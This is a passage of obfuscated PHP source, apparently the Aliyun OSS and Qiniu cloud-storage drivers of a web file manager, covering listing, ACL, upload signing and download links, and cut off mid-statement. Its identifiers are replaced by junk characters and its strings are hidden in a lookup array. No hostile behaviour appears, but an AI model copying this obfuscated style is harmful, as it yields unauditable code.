$°äËÄ¢æ[12] : $ÖÄê…Ş . $°äËÄ¢æ[8]; $ëïòÕ—Ï = $°äËÄ¢æ[12]; $äÅáÍ¬ = 500; $‘ø‘’õé = $ÖàÕ•¢ã = 0; while (!0) { check_abort(); $Â¼ÏôÆ = array($°äËÄ¢æ[1377] => $°äËÄ¢æ[8], $°äËÄ¢æ[1378] => $Ã¯„ÌŞ›, $°äËÄ¢æ[1379] => $äÅáÍ¬, $°äËÄ¢æ[1380] => $ëïòÕ—Ï); try { $İû™‡éÏ = $this->client->listObjects($this->bucket, $Â¼ÏôÆ); } catch (OSS\Core\OssException $‰•Ëğ£º) { break; } $ëïòÕ—Ï = $İû™‡éÏ->getNextMarker(); $•Ã¹’Ú“ = $İû™‡éÏ->getObjectList(); $æÔèÕÎ = $İû™‡éÏ->getPrefixList(); if ($ ¶Ó™à) { if (count($•Ã¹’Ú“) > 1 || count($•Ã¹’Ú“) == 1 && $•Ã¹’Ú“[0]->getKey() != $Ã¯„ÌŞ›) { $‘ø‘’õé += count($•Ã¹’Ú“) - 1; } if (!empty($æÔèÕÎ)) { $ÖàÕ•¢ã += count($æÔèÕÎ); } if ($ëïòÕ—Ï === $°äËÄ¢æ[12]) { break; } continue; } if ($Ñá×şé–) { if (!empty($•Ã¹’Ú“)) { if (count($•Ã¹’Ú“) > 1 || $•Ã¹’Ú“[0]->getKey() != $Ã¯„ÌŞ›) { return !0; } } } else { if (!empty($æÔèÕÎ)) { return !0; } } if ($ëïòÕ—Ï === $°äËÄ¢æ[12]) { break; } } if ($ ¶Ó™à) { return array($°äËÄ¢æ[202] => $‘ø‘’õé, $°äËÄ¢æ[203] => $ÖàÕ•¢ã); } return !1; } public function listAll($©„ğı…€) { $ôÑ¡é =& $_SERVER[¥Ÿ©ÒèÌ]; $°à½ØÄÑ = $this->fileList($©„ğı…€, $ôÑ¡é[12], !0); $ÆÈñ¬¨¨ = array(); foreach ($°à½ØÄÑ[$ôÑ¡é[76]] as $ÃÅã©†) { $ÆÈñ¬¨¨[$ÃÅã©†[$ôÑ¡é[32]]] = $ÃÅã©†[$ôÑ¡é[80]]; } foreach ($°à½ØÄÑ[$ôÑ¡é[77]] as $ÃÅã©†) { if (is_string($ÃÅã©†)) { $ÆÈñ¬¨¨[$ÃÅã©†] = 0; } } return $this->listAllFiles($©„ğı…€, array_keys($ÆÈñ¬¨¨), $ÆÈñ¬¨¨); } public function canRead($ïÚÅî«) { $Ğœúé =& $_SERVER[¥Ÿ©ÒèÌ]; $Ÿ”¢˜í = $this->pathAcl($ïÚÅî«); return $Ÿ”¢˜í == $Ğœúé[1390] || $Ÿ”¢˜í == $Ğœúé[550] ? !0 : !1; } public function canWrite($¾Ûíû±°) { $ÅóØ¥ÜÔ = $this->pathAcl($¾Ûíû±°); return $ÅóØ¥ÜÔ == $_SERVER[¥Ÿ©ÒèÌ][550] ? !0 : !1; } public function pathAcl($ôëº¶¬) { $¾áÇİ¡¥ =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ıßá‹Š = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ôëº¶¬)); } catch (OSS\Core\OssException $Óş¨’ú÷) { return !1; } $¥ØªÜ¨ = $ıßá‹Š == $¾áÇİ¡¥[37] ? $this->bucketAcl : $ıßá‹Š; if ($¥ØªÜ¨ == $¾áÇİ¡¥[1391]) { return $¾áÇİ¡¥[1390]; } if ($¥ØªÜ¨ == $¾áÇİ¡¥[1392]) { return $¾áÇİ¡¥[550]; } return $¥ØªÜ¨; } private function chmodPath($¤éş¦Ú‡, $”¬°›€ = '') { $§ıìŠ¤¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $¦Èêæ¹ = empty($”¬°›€) ? $§ıìŠ¤¬[1392] : $”¬°›€; $©ıõŸÍü = array($§ıìŠ¤¬[37], $§ıìŠ¤¬[191], $§ıìŠ¤¬[1391], $§ıìŠ¤¬[1392]); if (!in_array($¦Èêæ¹, $©ıõŸÍü)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¤éş¦Ú‡), $¦Èêæ¹); } catch (OSS\Core\OssException $ñª ôµ‹) { return !1; } return !0; } public function getContent($É²ÄÈËï) { return $this->fileSubstr($É²ÄÈËï, -1); } public function setContent($ÉúƒûØù, $û†³Çïò = '') { $¸´ä¿–œ =& $_SERVER[¥Ÿ©ÒèÌ]; try { $ª½œÓ½É = $this->trafficLimit($¸´ä¿–œ[1393]); $‡ˆò­Š = $this->client->putObject($this->bucket, $this->pathEncode($ÉúƒûØù), $û†³Çïò, $ª½œÓ½É); } catch (OSS\Core\OssException $÷ÌÏİÃù) { return !1; } $¡ô†Õı = array($¸´ä¿–œ[1383] => trim($‡ˆò­Š[$¸´ä¿–œ[1394]], $¸´ä¿–œ[117]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÉúƒûØù))); $this->updateObjMeta($ÉúƒûØù, $¡ô†Õı); return isset($‡ˆò­Š[$¸´ä¿–œ[1395]][$¸´ä¿–œ[1342]]) ? !0 : !1; } private function updateObjMeta($“Ößä÷±, $Æ¼ŸÕœ) { $“Ößä÷± = $this->pathEncode($“Ößä÷±); try { $¢¦…¥Ğ = array(OSS\OssClient::OSS_HEADERS => $Æ¼ŸÕœ); $this->client->copyObject($this->bucket, $“Ößä÷±, $this->bucket, $“Ößä÷±, $¢¦…¥Ğ); } catch (OSS\Core\OssException $²Èıà¶Ô) { return !1; } return !0; } public function upload($ãÊÜù—Ã, $üõÂ­Éí, $®£‹ìøü = false, $Éíí¤´º = REPEAT_REPLACE) { $Å¨œ©¡ï =& $_SERVER[¥Ÿ©ÒèÌ]; $¾¨“ÕÚû = trim($ãÊÜù—Ã, $Å¨œ©¡ï[8]); $­ÇüıÈ¼ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Å¨œ©¡ï[1383] => @md5_file($üõÂ­Éí)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ãÊÜù—Ã))); $­ÇüıÈ¼ = $this->trafficLimit($Å¨œ©¡ï[1393], $­ÇüıÈ¼); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¾¨“ÕÚû), $üõÂ­Éí, $­ÇüıÈ¼); } catch (OSS\Core\OssException $Û’²ğÉ) { return !1; } return $this->getPathOuter($ãÊÜù—Ã); } public function getHost() { $—ôËı¨ =& $_SERVER[¥Ÿ©ÒèÌ]; $›ëÍÍ§ = explode($—ôËı¨[176], parent::getHost()); return $›ëÍÍ§[0] . $—ôËı¨[176] . $this->bucket . $—ôËı¨[10] . $›ëÍÍ§[1]; } public function uploadFormData($·¸ûüÌ, $²ãƒÓÉ = 3600) { $ÌåŠÅì =& $_SERVER[¥Ÿ©ÒèÌ]; if (!($ŒÊ¿®İ¿ = $this->getHost())) { return !1; } $¼ÂÈ÷å = $²ãƒÓÉ; $æ¡Ô¦ß¹ = date($ÌåŠÅì[1396], time() + $¼ÂÈ÷å); $†Æ©¦ù = new DateTime($æ¡Ô¦ß¹); $Á²ö®¥ı = $†Æ©¦ù->format(DateTime::ISO8601); $ëı¸ßÒ˜ = strpos($Á²ö®¥ı, $ÌåŠÅì[300]); $Á²ö®¥ı = substr($Á²ö®¥ı, 0, $ëı¸ßÒ˜) . $ÌåŠÅì[1397]; $³ú‹— = 1048576000 * 5; $šóÂÍ¾û = $this->pathFather($·¸ûüÌ); $Å é‹Ñ = array($ÌåŠÅì[1296] => $Á²ö®¥ı, $ÌåŠÅì[1297] => array(array($ÌåŠÅì[1398], 0, $³ú‹—), array($ÌåŠÅì[1300], $ÌåŠÅì[1301], $šóÂÍ¾û))); $–­áéŠƒ = base64_encode(json_encode($Å é‹Ñ)); $“Î×•¥÷ = base64_encode(hash_hmac($ÌåŠÅì[227], $–­áéŠƒ, $this->secret, !0)); $¾ªŞİÓ‰ = array($ÌåŠÅì[1306] => $–­áéŠƒ, $ÌåŠÅì[1399] => $this->accessKey, $ÌåŠÅì[1302] => $ÌåŠÅì[1294], $ÌåŠÅì[1400] => $“Î×•¥÷, $ÌåŠÅì[174] => $ŒÊ¿®İ¿); $¾ªŞİÓ‰ = $this->trafficLimit($ÌåŠÅì[1393], $¾ªŞİÓ‰); return $¾ªŞİÓ‰; } public function multiUploadFormData($ «®ñ¨“, $ó¹ıµûî = 3600) { $«òÜ–Õ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!($“½âô°¦ = $this->getHost())) { return !1; } $¥ŒÉƒÆ = $this->trafficLimit($«òÜ–Õ[1393]); $‡¦ğÁË• = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ «®ñ¨“), $¥ŒÉƒÆ); return array($«òÜ–Õ[218] => $‡¦ğÁË•, $«òÜ–Õ[174] => $“½âô°¦ . $«òÜ–Õ[8] . $this->pathEncode($ «®ñ¨“), $«òÜ–Õ[219] => gmdate($«òÜ–Õ[1401]), $«òÜ–Õ[95] => $ «®ñ¨“); } public function multiUploadAuthData($ÀÜÆˆé‘, $¼ÀøÌåú = array()) { $üş°™÷ú =& $_SERVER[¥Ÿ©ÒèÌ]; $Ó­£’Ï = isset($¼ÀøÌåú[$üş°™÷ú[219]]) ? $¼ÀøÌåú[$üş°™÷ú[219]] : gmdate($üş°™÷ú[1401]); $ÜÖ¿š±ı = isset($¼ÀøÌåú[$üş°™÷ú[167]]) ? $¼ÀøÌåú[$üş°™÷ú[167]] : $üş°™÷ú[12]; $İù´˜ı = $ÀÜÆˆé‘; if (isset($¼ÀøÌåú[$üş°™÷ú[95]])) { $İù´˜ı = $¼ÀøÌåú[$üş°™÷ú[95]]; unset($¼ÀøÌåú[$üş°™÷ú[95]]); } if (isset($¼ÀøÌåú[$üş°™÷ú[220]])) { $¼ÀøÌåú[$üş°™÷ú[219]] = $Ó­£’Ï; return $this->listUploadParts($İù´˜ı, $¼ÀøÌåú); } $Áßª—„ = array($üş°™÷ú[221], $üş°™÷ú[12], $üş°™÷ú[118], $Ó­£’Ï, "\170\55\x6f\x73\x73\55\144\141\x74\x65\72{$Ó­£’Ï}", $üş°™÷ú[8] . $this->bucket . $üş°™÷ú[8] . $İù´˜ı . $ÜÖ¿š±ı); if (strpos($ÜÖ¿š±ı, $üş°™÷ú[222]) === 0) { $Áßª—„[0] = $üş°™÷ú[223]; if ($ ğˆ÷Şø = $this->trafficLimit($üş°™÷ú[1393])) { $İù´˜ı = $üş°™÷ú[1402]; array_splice($Áßª—„, 5, 0, $İù´˜ı . $üş°™÷ú[4] . $ ğˆ÷Şø[$İù´˜ı]); } } if (isset($¼ÀøÌåú[$üş°™÷ú[224]]) && $¼ÀøÌåú[$üş°™÷ú[224]] == $üş°™÷ú[225]) { $Áßª—„[0] = $üş°™÷ú[225]; } if (!empty($¼ÀøÌåú[$üş°™÷ú[1403]])) { $Şİ ÀÔ± = array_merge(array($Áßª—„[4]), $¼ÀøÌåú[$üş°™÷ú[1403]]); sort($Şİ ÀÔ±); $Áßª—„[4] = implode($üş°™÷ú[226], $Şİ ÀÔ±); } $“î•Ôäö = implode($üş°™÷ú[226], $Áßª—„); $¼†Õûğ£ = base64_encode(hash_hmac($üş°™÷ú[227], $“î•Ôäö, $this->secret, !0)); $Ñ¼é“Ô = $üş°™÷ú[1367] . $this->accessKey . $üş°™÷ú[4] . $¼†Õûğ£; if (strpos($ÜÖ¿š±ı, $üş°™÷ú[222]) === 0) { $Ñ¼é“Ô = array($üş°™÷ú[229] => $Ñ¼é“Ô, $üş°™÷ú[219] => $Ó­£’Ï); if ($ ğˆ÷Şø) { $Ñ¼é“Ô = array_merge($Ñ¼é“Ô, $ ğˆ÷Şø); } } return $Ñ¼é“Ô; } public function listUploadParts($‹Í †‡¶, $’ó âÔŞ) { $ĞÚŸ©¤Ÿ =& $_SERVER[¥Ÿ©ÒèÌ]; $¼°çÓ‘ = parse_url_query($’ó âÔŞ[$ĞÚŸ©¤Ÿ[167]]); $¬éìµø = $this->client->listParts($this->bucket, $this->pathEncode($‹Í †‡¶), $¼°çÓ‘[$ĞÚŸ©¤Ÿ[218]]); $âãÆ„şã = $¬éìµø->getListPart(); $ÖÍïóÅ¶ = array(); foreach ($âãÆ„şã as $ˆŒõı²ç) { $ÖÍïóÅ¶[] = array($ĞÚŸ©¤Ÿ[1387] => $ˆŒõı²ç->getPartNumber(), $ĞÚŸ©¤Ÿ[1388] => trim($ˆŒõı²ç->getETag(), $ĞÚŸ©¤Ÿ[117])); } unset($’ó âÔŞ[$ĞÚŸ©¤Ÿ[220]], $’ó âÔŞ[$ĞÚŸ©¤Ÿ[224]]); $ó„²…ı× = $this->multiUploadAuthData($‹Í †‡¶, $’ó âÔŞ); if (empty($ó„²…ı×)) { return !1; } return array($ĞÚŸ©¤Ÿ[229] => $ó„²…ı×, $ĞÚŸ©¤Ÿ[219] => $’ó âÔŞ[$ĞÚŸ©¤Ÿ[219]], $ĞÚŸ©¤Ÿ[231] => $ÖÍïóÅ¶); } public function download($€¶ô”ôè, $íãÈÉÓÒ) { if ($this->isFolder($€¶ô”ôè)) { return !1; } try { $©×”«“ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $íãÈÉÓÒ); $©×”«“ = $this->trafficLimit($_SERVER[¥Ÿ©ÒèÌ][110], $©×”«“); $this->client->getObject($this->bucket, $this->pathEncode($€¶ô”ôè), $©×”«“); } catch (OSS\Core\OssException $Ñº´ÇÎ) { return !1; } return $íãÈÉÓÒ; } public function fileSubstr($à¹Ù—ö, $ˆ¿—î™‰ = 0, $ÚïøíÔÏ = false) { if ($ˆ¿—î™‰ === -1) { $Œ³ğ½æ‹ = array(); } else { if ($ÚïøíÔÏ === !1) { $ª´¹ß¥ = $this->size($à¹Ù—ö); } else { $ª´¹ß¥ = $ˆ¿—î™‰ + $ÚïøíÔÏ - 1; } $Œ³ğ½æ‹ = array(OSS\OssClient::OSS_RANGE => "{$ˆ¿—î™‰}\55{$ª´¹ß¥}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($à¹Ù—ö), $Œ³ğ½æ‹); } catch (OSS\Core\OssException $Ş¤ãÛù·) { think_exception($Ş¤ãÛù·->getMessage()); return !1; } } private function trafficLimit($—òâßè÷, $îƒÇĞ¶Š = array()) { $›­šöøÛ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($—òâßè÷ == $›­šöøÛ[1393] && $this->isUploadServer() || $—òâßè÷ == $›­šöøÛ[110] && $this->isFileOutServer()) { return $îƒÇĞ¶Š; } $ëÄå ¬ô = floatval($GLOBALS[$›­šöøÛ[6]][$›­šöøÛ[90]][$›­šöøÛ[108]][$—òâßè÷]) * 1024 * 1024 * 8; if (!$ëÄå ¬ô) { return $îƒÇĞ¶Š; } $ëÄå ¬ô = $ëÄå ¬ô < 819200 ? 819200 : ($ëÄå ¬ô > 838860800 ? 838860800 : $ëÄå ¬ô); $îƒÇĞ¶Š[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ëÄå ¬ô); return $îƒÇĞ¶Š; } public function link($©ë²¶ª¼, $õ·ÃÉÎà = array()) { $®¼ûî… =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->exist($©ë²¶ª¼) || $this->isFolder($©ë²¶ª¼)) { return !1; } try { $õ·ÃÉÎà = $this->trafficLimit($®¼ûî…[110], $õ·ÃÉÎà); $ÃÉğ³Œ = $this->client->signUrl($this->bucket, $this->pathEncode($©ë²¶ª¼), 3600 * 12, $®¼ûî…[225], $õ·ÃÉÎà); return $this->getCdnLink($ÃÉğ³Œ); } catch (OSS\Core\OssException $©ÌÉÆ) { return !1; } } public function fileOut($€†Â¶Ñµ, $“ã¾ÁÍ÷ = false, $§¢¡‚µÅ = false, $ÅÉˆèşğ = '') { $³Ë´î×µ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->isFileOutServer()) { return $this->fileOutServer($€†Â¶Ñµ, $“ã¾ÁÍ÷, $§¢¡‚µÅ, $ÅÉˆèşğ); } if (!$§¢¡‚µÅ) { $§¢¡‚µÅ = $this->pathThis($€†Â¶Ñµ); } $§¢¡‚µÅ = rawurlencode($§¢¡‚µÅ); $ÂâÏÓ˜ = get_file_mime(get_path_ext($§¢¡‚µÅ)); if ($ÂâÏÓ˜ == $³Ë´î×µ[212]) { return parent::fileOut($€†Â¶Ñµ, $“ã¾ÁÍ÷, $§¢¡‚µÅ, $ÅÉˆèşğ); } $“ã¾ÁÍ÷ = $“ã¾ÁÍ÷ ? $³Ë´î×µ[1404] : $³Ë´î×µ[1405]; $³˜†ìı‘ = array(OSS\OssClient::OSS_SUB_RESOURCE => $³Ë´î×µ[1406] . rawurlencode("{$“ã¾ÁÍ÷}\73\146\151\x6c\145\156\x61\155\145\75{$§¢¡‚µÅ}")); $³˜†ìı‘[OSS\OssClient::OSS_SUB_RESOURCE] .= $³Ë´î×µ[1407] . rawurlencode($ÂâÏÓ˜); $ËÊ€•Ò = $this->link($€†Â¶Ñµ, $³˜†ìı‘); $this->fileOutLink($ËÊ€•Ò); } public function fileOutServer($Ï–—ˆ©Á, $ÂˆíÆÍ = false, $ÎŸÜ¢Â… = false, $—è¹¸ë‰ = '') { parent::fileOut($Ï–—ˆ©Á, $ÂˆíÆÍ, $ÎŸÜ¢Â…, $—è¹¸ë‰); } public function fileOutImage($ã¯®¢Ö, $Î•„ÁŞ = 250) { $é„úôÉ¼ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¥Ÿ©ÒèÌ][1408] . $Î•„ÁŞ); $¿Ã¿ºÏ¯ = $this->link($ã¯®¢Ö, $é„úôÉ¼); $this->fileOutLink($¿Ã¿ºÏ¯); } public function fileOutImageServer($çëñä‚É, $Æßİá¬³ = 250) { parent::fileOutImage($çëñä‚É, $Æßİá¬³); } public function fileOutLink($øàÏÅÊ¬) { $ß½¦½¸ú =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->isCdnHost() && substr($øàÏÅÊ¬, 0, 7) == $ß½¦½¸ú[1309]) { $øàÏÅÊ¬ = $ß½¦½¸ú[1310] . substr($øàÏÅÊ¬, 7); } header($ß½¦½¸ú[158] . $øàÏÅÊ¬); die; } public function hashMd5($ğ¾Õü’, $ËÉğÈ º = '') { $¾ûãŞĞñ =& $_SERVER[¥Ÿ©ÒèÌ]; $¦©ûĞ = $this->_objectMeta($ğ¾Õü’); if (!$¦©ûĞ) { return $¾ûãŞĞñ[12]; } if (!isset($¦©ûĞ[$¾ûãŞĞñ[1383]]) && !empty($ËÉğÈ º)) { $é“êŒñ = $this->updateObjMeta($ğ¾Õü’, array($¾ûãŞĞñ[1383] => $ËÉğÈ º)); $¦©ûĞ[$¾ûãŞĞñ[1383]] = $é“êŒñ ? $ËÉğÈ º : $¾ûãŞĞñ[12]; } return isset($¦©ûĞ[$¾ûãŞĞñ[1383]]) ? strtolower($¦©ûĞ[$¾ûãŞĞñ[1383]]) : $¾ûãŞĞñ[12]; } public function size($ó»à¯úÃ) { $¯Š™Ä = $this->objectMeta($ó»à¯úÃ); return $¯Š™Ä ? $¯Š™Ä[$_SERVER[¥Ÿ©ÒèÌ][80]] : 0; } public function info($Á§ €ñÙ) { if ($this->isFolder($Á§ €ñÙ)) { return $this->folderInfo($Á§ €ñÙ); } else { if ($this->isFile($Á§ €ñÙ)) { return $this->fileInfo($Á§ €ñÙ); } } return !1; } public function exist($ƒãÒ«£§) { return $this->isFile($ƒãÒ«£§) || $this->isFolder($ƒãÒ«£§); } public function isFile($ı†¨œ«™) { return !$this->isFolder($ı†¨œ«™) && $this->objectMeta($ı†¨œ«™); } public function isFolder($©Û÷àù£) { return $this->cacheMethod($_SERVER[¥Ÿ©ÒèÌ][198], $©Û÷àù£); } protected function objectMeta($­¦ëØÃÍ) { return $this->cacheMethod($_SERVER[¥Ÿ©ÒèÌ][199], $­¦ëØÃÍ); } protected function _objectMeta($Ú¨ŸĞ…ú) { $ƒ—«¤æì =& $_SERVER[¥Ÿ©ÒèÌ]; try { $îñÍËµ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ú¨ŸĞ…ú)); } catch (OSS\Core\OssException $üô ·ß) { $îñÍËµ = !1; } if ($îñÍËµ) { $îñÍËµ[$ƒ—«¤æì[80]] = intval($îñÍËµ[$ƒ—«¤æì[1381]]); } return $îñÍËµ; } protected function _isFolder($À²²¥¢…) { $¹½¶ÓÁÑ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($À²²¥¢… == $¹½¶ÓÁÑ[12] || $À²²¥¢… == $¹½¶ÓÁÑ[8]) { return !0; } $·º÷¼ş¨ = array($¹½¶ÓÁÑ[1377] => $¹½¶ÓÁÑ[8], $¹½¶ÓÁÑ[1378] => rtrim($À²²¥¢…, $¹½¶ÓÁÑ[8]) . $¹½¶ÓÁÑ[8], $¹½¶ÓÁÑ[1379] => 1, $¹½¶ÓÁÑ[1380] => $¹½¶ÓÁÑ[12]); $®¾çİê = $this->client->listObjects($this->bucket, $·º÷¼ş¨); if ($®¾çİê->getObjectList() || $®¾çİê->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($â¯ßùÎÒ) { parent::__construct(); require_once SDK_DIR . $_SERVER[¥Ÿ©ÒèÌ][1409]; $this->_init($â¯ßùÎÒ); } public function _init($®Âıˆ‹ù) { $Ÿø¶ÄÛ° =& $_SERVER[¥Ÿ©ÒèÌ]; foreach ($®Âıˆ‹ù as $İ©ª’Ã¤ => $¼¼«Ÿ…“) { if (isset($this->{$İ©ª’Ã¤})) { $this->{$İ©ª’Ã¤} = $¼¼«Ÿ…“; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ÿø¶ÄÛ°[1410] . LNG($Ÿø¶ÄÛ°[1368])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($õ¯Äïœ, $×÷„°¸Ê = '', $İ©ûÃ¤’ = REPEAT_RENAME) { if ($this->setContent($õ¯Äïœ, $×÷„°¸Ê)) { return $this->getPathOuter($õ¯Äïœ); } return !1; } public function mkdir($ø Å®Íş, $°Ú¡Ú«ö = REPEAT_SKIP) { $úà©áÀâ =& $_SERVER[¥Ÿ©ÒèÌ]; $ò±Ã™öú = trim($ø Å®Íş, $úà©áÀâ[8]); if ($this->_isFolder($ò±Ã™öú)) { return $this->getPathOuter($ò±Ã™öú); } $ø Å®Íş = $ò±Ã™öú . $úà©áÀâ[8]; $®ğ¹˜ÔÌ = get_path_this($ò±Ã™öú); $—Çİ¾ø = $ø Å®Íş . $®ğ¹˜ÔÌ; if (!$this->mkfile($—Çİ¾ø)) { return !1; } if (!$this->moveFile($—Çİ¾ø, $ø Å®Íş)) { $this->delFile($—Çİ¾ø); return !1; } return $this->getPathOuter($ò±Ã™öú); } public function copyFile($š²­Úî§, $­µ›Ç‘ª) { $ÒŒ‹›¦µ = $this->bucketManager->copy($this->bucket, $š²­Úî§, $this->bucket, $­µ›Ç‘ª, !0); return $ÒŒ‹›¦µ ? !1 : $this->getPathOuter($­µ›Ç‘ª); } public function moveFile($®½í½•û, $ö¨ÜâìÀ) { $ÚÜïå’¬ = $this->bucketManager->move($this->bucket, $®½í½•û, $this->bucket, $ö¨ÜâìÀ, !0); return $ÚÜïå’¬ ? !1 : $this->getPathOuter($ö¨ÜâìÀ); } public function delFile($Ñ›­ÆÚ—) { if (!$this->exist($Ñ›­ÆÚ—)) { return !0; } $áÇ—ÁøÌ = $this->bucketManager->delete($this->bucket, $Ñ›­ÆÚ—); return $áÇ—ÁøÌ ? !1 : !0; } public function delFolder($½»´Ëê´) { $“îøË‘’ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->exist($½»´Ëê´)) { return !0; } $this->listItemCache = !1; $§Êû‰ö = $this->fileList($½»´Ëê´); $this->listItemCache = !0; $„—ƒŒÎÔ = trim($½»´Ëê´, $“îøË‘’[8]) . $“îøË‘’[8]; if (!empty($½»´Ëê´) && $½»´Ëê´ !== $“îøË‘’[190] && !in_array($„—ƒŒÎÔ, $§Êû‰ö[$“îøË‘’[77]])) { $§Êû‰ö[$“îøË‘’[77]][] = $„—ƒŒÎÔ; } $ËÉò’Á† = $this->delByBatch($§Êû‰ö[$“îøË‘’[76]]); if (!$ËÉò’Á†) { return !1; } $ËÉò’Á† = $this->delByBatch($§Êû‰ö[$“îøË‘’[77]]); if (!$ËÉò’Á†) { return !1; } return $this->delFile($„—ƒŒÎÔ); } private function delByBatch($ÃÍÜ¢¿í) { foreach (array_chunk($ÃÍÜ¢¿í, 1000) as $¿¡ÀĞåÀ) { $£ªËÉäì = $this->bucketManager->buildBatchDelete($this->bucket, $¿¡ÀĞåÀ); list($ô†±õáõ, $˜¢‘µ‹å) = $this->bucketManager->batch($£ªËÉäì); if ($˜¢‘µ‹å) { return !1; } } return !0; } public function rename($Ñ¤Ç€¯¶, $îäÇÀÆ‹) { return $this->renameObject($Ñ¤Ç€¯¶, $îäÇÀÆ‹); } public function fileInfo($­ÜÃ¡ş´, $ùå¨œË© = false, $ÎÆèø©­ = array()) { $‚ĞÄ¹øÜ =& $_SERVER[¥Ÿ©ÒèÌ]; $ˆ÷Êè˜Ò = array($‚ĞÄ¹øÜ[32] => $this->pathThis($­ÜÃ¡ş´), $‚ĞÄ¹øÜ[78] => $this->getPathOuter($‚ĞÄ¹øÜ[8] . $­ÜÃ¡ş´), $‚ĞÄ¹øÜ[33] => $‚ĞÄ¹øÜ[192], $‚ĞÄ¹øÜ[80] => isset($ÎÆèø©­[$‚ĞÄ¹øÜ[1411]]) ? $ÎÆèø©­[$‚ĞÄ¹øÜ[1411]] : 0, $‚ĞÄ¹øÜ[167] => $this->ext($­ÜÃ¡ş´)); if ($ùå¨œË©) { return $ˆ÷Êè˜Ò; } $ˆ÷Êè˜Ò[$‚ĞÄ¹øÜ[193]] = $ˆ÷Êè˜Ò[$‚ĞÄ¹øÜ[86]] = 0; $ˆ÷Êè˜Ò[$‚ĞÄ¹øÜ[194]] = $ˆ÷Êè˜Ò[$‚ĞÄ¹øÜ[195]] = !0; if (empty($ÎÆèø©­)) { $ÎÆèø©­ = $this->objectMeta($­ÜÃ¡ş´); if (!$ÎÆèø©­) { return $ˆ÷Êè˜Ò; } } if (isset($ÎÆèø©­[$‚ĞÄ¹øÜ[1412]])) { $ˆ÷Êè˜Ò[$‚ĞÄ¹øÜ[86]] = substr($ÎÆèø©­[$‚ĞÄ¹øÜ[1412]] . $‚ĞÄ¹øÜ[12], 0, 10); } if (isset($ÎÆèø©­[$‚ĞÄ¹øÜ[1411]])) { $ˆ÷Êè˜Ò[$‚ĞÄ¹øÜ[80]] = $ÎÆèø©­[$‚ĞÄ¹øÜ[1411]]; } return $ˆ÷Êè˜Ò; } public function folderInfo($Ú£Ãı×†, $¢ÇÊºÂ¶ = false) { $›Îò‚»õ =& $_SERVER[¥Ÿ©ÒèÌ]; $„èä®Ö£ = array($›Îò‚»õ[32] => $this->pathThis($Ú£Ãı×†), $›Îò‚»õ[78] => $this->getPathOuter($›Îò‚»õ[8] . $Ú£Ãı×†), $›Îò‚»õ[33] => $›Îò‚»õ[79]); if ($¢ÇÊºÂ¶) { return $„èä®Ö£; } $„èä®Ö£[$›Îò‚»õ[193]] = $„èä®Ö£[$›Îò‚»õ[86]] = 0; $„èä®Ö£[$›Îò‚»õ[194]] = $„èä®Ö£[$›Îò‚»õ[195]] = !0; $Ú£Ãı×† = rtrim($Ú£Ãı×†, $›Îò‚»õ[8]) . $›Îò‚»õ[8]; $ııÒÄÆ = $this->objectMeta($Ú£Ãı×†); if (isset($ııÒÄÆ[$›Îò‚»õ[1412]])) { $„èä®Ö£[$›Îò‚»õ[86]] = substr($ııÒÄÆ[$›Îò‚»õ[1412]] . $›Îò‚»õ[12], 0, 10); } return $„èä®Ö£; } public function listPath($Ô…¡ëïØ, $ÙŠâ›ö÷ = false) { $··ğıÆÍ =& $_SERVER[¥Ÿ©ÒèÌ]; $§„à±¥¤ = $this->fileList($Ô…¡ëïØ, $··ğıÆÍ[8], !0); foreach ($§„à±¥¤[$··ğıÆÍ[77]] as $¿…á’¯ï => $®ğÉ—×õ) { $§„à±¥¤[$··ğıÆÍ[77]][$¿…á’¯ï] = $this->folderInfo($®ğÉ—×õ, $ÙŠâ›ö÷); } foreach ($§„à±¥¤[$··ğıÆÍ[76]] as $¿…á’¯ï => $®ğÉ—×õ) { $§„à±¥¤[$··ğıÆÍ[76]][$¿…á’¯ï] = $this->fileInfo($®ğÉ—×õ[$··ğıÆÍ[95]], $ÙŠâ›ö÷, $®ğÉ—×õ); } return $§„à±¥¤; } public function has($€×…µé, $Û¼²ãµ´ = false, $©·¿ò“Ã = true) { $•¦»âß =& $_SERVER[¥Ÿ©ÒèÌ]; $€×…µé = trim($€×…µé, $•¦»âß[8]); $­Èö‘ò¢ = empty($€×…µé) && $€×…µé !== $•¦»âß[190] ? $•¦»âß[12] : $€×…µé . $•¦»âß[8]; $¬Ü™Ğ¬ = $•¦»âß[12]; $¾Ùœ¼ì = 500; $ÍÙ”´şÙ = $•¦»âß[8]; $İ—ôŞ = $Ú²ÜÇ¼ş = 